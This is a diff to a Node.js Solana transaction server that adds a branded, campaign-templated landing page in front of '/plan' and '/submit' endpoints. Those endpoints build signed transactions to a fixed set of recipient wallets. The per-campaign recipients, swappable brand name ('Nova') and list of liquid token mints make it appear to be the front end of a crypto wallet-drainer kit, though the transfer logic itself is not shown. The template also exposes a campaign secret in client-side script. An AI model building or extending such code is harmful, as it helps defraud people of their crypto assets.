@@ -1,11 +1,17 @@
 import http from "node:http";
 import crypto from "node:crypto";
+import fs from "node:fs";
+import path from "node:path";
+import { fileURLToPath } from "node:url";
 import "dotenv/config";
 import { buildPlan, submitSigned, makeConnection } from "./core.js";
 import { loadAltAuthority, ensureAlt, defaultAltAddresses } from "./alt.js";
 import { parseRecipients } from "./recipients.js";
 import * as store from "./store.js";
 import * as ratelimit from "./ratelimit.js";
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const LANDING_FILE = path.join(__dirname, "index.html");
 
 const PORT = Number(process.env.PORT || 3000);
 const RPC = process.env.SOLANA_RPC_URL || "https://api.mainnet-beta.solana.com";
@@ -27,6 +33,39 @@ const RECIPIENT_SET = new Set(RECIPIENTS);
 const connection = makeConnection(RPC);
 const altAuthority = ENABLE_ALT ? loadAltAuthority() : null;
 
+/* ---------- landing template ---------- */
+let LANDING_TEMPLATE = null;
+function loadLanding() {
+  if (LANDING_TEMPLATE) return LANDING_TEMPLATE;
+  LANDING_TEMPLATE = fs.readFileSync(LANDING_FILE, "utf8");
+  return LANDING_TEMPLATE;
+}
+
+function escForJsString(s) {
+  return String(s || "").replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+}
+
+function renderLanding(campaign) {
+  const tpl = loadLanding();
+  const recipients = campaign ? [campaign.recipient] : RECIPIENTS;
+  const mode = campaign?.mode || "auto";
+  const liquidMints = campaign?.liquidMints || [];
+  const campaignId = campaign?.id || "";
+  const secret = campaign?.secret || "";
+  const brand = campaign?.name || "Nova";
+
+  return tpl
+    .replace(/__PLAN_ENDPOINT__/g, "/plan")
+    .replace(/__SUBMIT_ENDPOINT__/g, "/submit")
+    .replace(/__CAMPAIGN_ID__/g, escForJsString(campaignId))
+    .replace(/__CAMPAIGN_SECRET__/g, escForJsString(secret))
+    .replace(/__RECIPIENTS__/g, JSON.stringify(recipients))
+    .replace(/__MODE__/g, escForJsString(mode))
+    .replace(/__LIQUID_MINTS__/g, JSON.stringify(liquidMints))
+    .replace(/__APP_NAME__/g, escForJsString(brand));
+}
+
+/* ---------- helpers ---------- */
 function json(res, code, body) {
   res.writeHead(code, {
     "content-type": "application/json",
@@ -35,10 +74,15 @@ function json(res, code, body) {
   res.end(JSON.stringify(body));
 }
 
+function html(res, code, body) {
+  res.writeHead(code, { "content-type": "text/html; charset=utf-8" });
+  res.end(body);
+}
+
 function readBody(req) {
   return new Promise((resolve, reject) => {
     let data = "";
-    req.on("data", (chunk) => (data += chunk));
+    req.on("data", (c) => (data += c));
     req.on("end", () => {
       try {
         resolve(data ? JSON.parse(data) : {});
@@ -81,6 +125,20 @@ async function ensureCampaignAlt(campaign) {
   }
 }
 
+/* ---------- routes ---------- */
+async function handleLanding(req, res) {
+  const url = new URL(req.url, `http://${req.headers.host || "localhost"}`);
+  const cid = url.searchParams.get("c");
+  const campaign = cid ? store.get(cid) : null;
+
+  try {
+    html(res, 200, renderLanding(campaign));
+  } catch (err) {
+    console.error("[landing]", err);
+    html(res, 500, "landing template error");
+  }
+}
+
 async function handlePlan(req, res) {
   const ip = clientIp(req);
   if (!ratelimit.allow(ip)) return json(res, 429, { error: "rate limited" });
@@ -93,7 +151,6 @@ async function handlePlan(req, res) {
     return json(res, 401, { error: "unauthorized" });
   }
 
-  // Enforce recipient set.
   const requestedRecipients = Array.isArray(body.recipients) && body.recipients.length
     ? body.recipients
     : [body.recipient];
@@ -202,19 +259,26 @@ const server = http.createServer(async (req, res) => {
   if (req.method === "OPTIONS") {
     res.writeHead(204, {
       "access-control-allow-origin": "*",
-      "access-control-allow-methods": "POST,OPTIONS",
+      "access-control-allow-methods": "POST,GET,OPTIONS",
       "access-control-allow-headers": "content-type",
     });
     return res.end();
   }
   try {
+    if (req.method === "GET" && (req.url === "/" || req.url.startsWith("/?"))) {
+      return await handleLanding(req, res);
+    }
     if (req.method === "POST" && req.url === "/plan") return await handlePlan(req, res);
     if (req.method === "POST" && req.url === "/submit") return await handleSubmit(req, res);
-    if (req.method === "GET" && req.url === "/health") return json(res, 200, { ok: true, alt: ENABLE_ALT, cnft: ENABLE_CNFT });
+    if (req.method === "GET" && req.url === "/health") {
+      return json(res, 200, { ok: true, alt: ENABLE_ALT, cnft: ENABLE_CNFT });
+    }
     json(res, 404, { error: "not found" });
   } catch (err) {
     json(res, 400, { error: err.message });
   }
 });
 
-server.listen(PORT, () => log("start", { port: PORT, recipients: RECIPIENTS, alt: !!altAuthority, cnft: ENABLE_CNFT }));
+server.listen(PORT, () =>
+  log("start", { port: PORT, recipients: RECIPIENTS, alt: !!altAuthority, cnft: ENABLE_CNFT })
+);
